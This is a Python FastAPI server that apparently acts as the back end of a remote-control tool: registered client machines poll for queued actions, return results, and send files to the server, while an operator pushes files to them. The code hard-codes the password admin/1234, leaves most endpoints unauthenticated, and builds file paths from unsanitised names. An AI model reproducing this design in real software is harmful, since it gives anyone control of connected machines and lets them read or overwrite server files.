from fastapi import FastAPI, UploadFile, File, Form, Header
from fastapi.responses import HTMLResponse, FileResponse
import os, time, uuid, json

app = FastAPI()

clients = {}
tasks = {}
results = {}
sessions = {}

UPLOAD_DIR = "uploads"
DOWNLOAD_DIR = "downloads"

os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(DOWNLOAD_DIR, exist_ok=True)

# ---------- AUTH ----------
USERS = {"admin": "1234"}

@app.post("/login")
def login(username: str = Form(...), password: str = Form(...)):
    if USERS.get(username) == password:
        token = str(uuid.uuid4())
        sessions[token] = username
        return {"token": token}
    return {"error": "invalid"}

def verify(token):
    return token in sessions

# ---------- CLIENT ----------
@app.post("/register")
def register(system_id: str = Form(...)):
    clients[system_id] = time.time()
    return {"ok": True}

@app.get("/clients")
def get_clients():
    now = time.time()
    return {c: "online" for c, t in clients.items() if now - t < 15}

# ---------- TASK ----------
@app.post("/task")
def task(system_id: str = Form(...),
         action: str = Form(...),
         path: str = Form(""),
         paths: str = Form(""),
         dst: str = Form(""),
         token: str = Header(...)):

    if not verify(token):
        return {"error": "unauthorized"}

    data = {"action": action}

    if path:
        data["path"] = path

    if paths:
        data["paths"] = json.loads(paths)

    if dst:
        data["dst"] = dst

    tasks[system_id] = data
    return {"ok": True}

@app.get("/task/{system_id}")
def get_task(system_id: str):
    return tasks.pop(system_id, {"action": None})

@app.post("/result")
def result(system_id: str = Form(...), data: str = Form(...)):
    results[system_id] = data
    return {"ok": True}

@app.get("/result/{system_id}")
def get_result(system_id: str):
    return results.pop(system_id, {})

# ---------- ADMIN → CLIENT (UPLOAD) ----------
@app.post("/upload_chunk")
async def upload_chunk(system_id: str = Form(...),
                       filename: str = Form(...),
                       chunk_id: int = Form(...),
                       file: UploadFile = File(...),
                       token: str = Header(...)):

    if not verify(token):
        return {"error": "unauthorized"}

    folder = f"{UPLOAD_DIR}/{system_id}_{filename}"
    os.makedirs(folder, exist_ok=True)

    with open(f"{folder}/{chunk_id}.part", "wb") as f:
        f.write(await file.read())

    return {"ok": True}

@app.post("/complete")
def complete(system_id: str = Form(...),
             filename: str = Form(...),
             total_chunks: int = Form(...),
             token: str = Header(...)):

    if not verify(token):
        return {"error": "unauthorized"}

    tasks[system_id] = {
        "action": "assemble",
        "filename": filename,
        "total": total_chunks
    }
    return {"ok": True}

# ---------- CLIENT → SERVER (DOWNLOAD) ----------
@app.post("/upload_from_client")
async def upload_from_client(system_id: str = Form(...),
                             file: UploadFile = File(...)):

    path = os.path.join(DOWNLOAD_DIR, file.filename)

    with open(path, "wb") as f:
        f.write(await file.read())

    return {"status": "saved", "file": file.filename}

@app.get("/get_file/{filename}")
def get_file(filename: str):
    return FileResponse(os.path.join(DOWNLOAD_DIR, filename), filename=filename)

# ---------- DASHBOARD ----------
@app.get("/dashboard", response_class=HTMLResponse)
def dashboard():
    return "<h3>Server Running</h3>"
